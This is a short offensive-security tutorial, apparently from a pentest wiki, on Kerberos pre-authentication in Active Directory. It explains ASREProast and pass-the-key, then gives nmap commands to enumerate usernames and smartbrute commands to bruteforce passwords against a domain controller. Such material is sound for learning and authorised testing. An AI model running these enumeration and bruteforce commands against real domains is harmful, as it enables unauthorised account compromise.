## Theory
The Kerberos authentication protocol works with tickets in order to grant access. A ST (Service Ticket) can be obtained by presenting a TGT (Ticket Granting Ticket). That prior TGT can only be obtained by validating a first step named "pre-authentication" (except if that requirement is explicitly removed for some accounts, making them vulnerable to ASREProast).

The pre-authentication requires the requesting user to supply its secret key (DES, RC4, AES128 or AES256) derived from his password. An attacker knowing that secret key doesn't need knowledge of the actual password to obtain tickets. This is called pass-the-key.

Sometimes, the pre-authentication is disabled on some accounts. The attacker can then obtain information encrypted with the account's key. While the obtained TGT cannot be used since it's encrypted with a key the attacker has no knowledge of, the encrypted information can be used to bruteforce the account's password. This is called ASREProast.

The pre-authentication step can be bruteforced. This type of credential bruteforcing is way faster and stealthier than other bruteforcing methods relying on NTLM. Pre-authentication bruteforcing can even be faster by using UDP as the transport protocol, hence requiring less frames to be sent.

## Exploit
### Users enum
!!! note
    A TGT request is made through an AS-REQ message. When an invalid username is requested, the server will respond using the Kerberos error code `KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN` in the AS-REP message. When working with a valid username, either a TGT will be obtained, or an error like `KRB5KDC_ERR_PREAUTH_REQUIRED` will be raised (i.e. in this case, indicating that the user is required to perform preauthentication).
Create user wordlist
```bash
michael.scott
jim.halpert
oscar.martinez
pam.beesly
kevin.malone
```
Enum with nmap
```bash
nmap -p 88 --script="krb5-enum-users" --script-args="krb5-enum-users.realm='$DOMAIN',userdb=$WORDLIST" $IP_DC
```
### Pre-auth Bruteforce
Tools like kerbrute (Go) and smartbrute (Python) can be used to bruteforce credentials through the Kerberos pre-authentication.
```bash
# brute mode, users and passwords lists supplied
smartbrute.py brute -bU $USER_LIST -bP $PASSWORD_LIST kerberos -d $DOMAIN

# smart mode, valid credentials supplied for enumeration
smartbrute.py smart -bP $PASSWORD_LIST ntlm -d $DOMAIN -u $USER -p $PASSWORD kerberos
```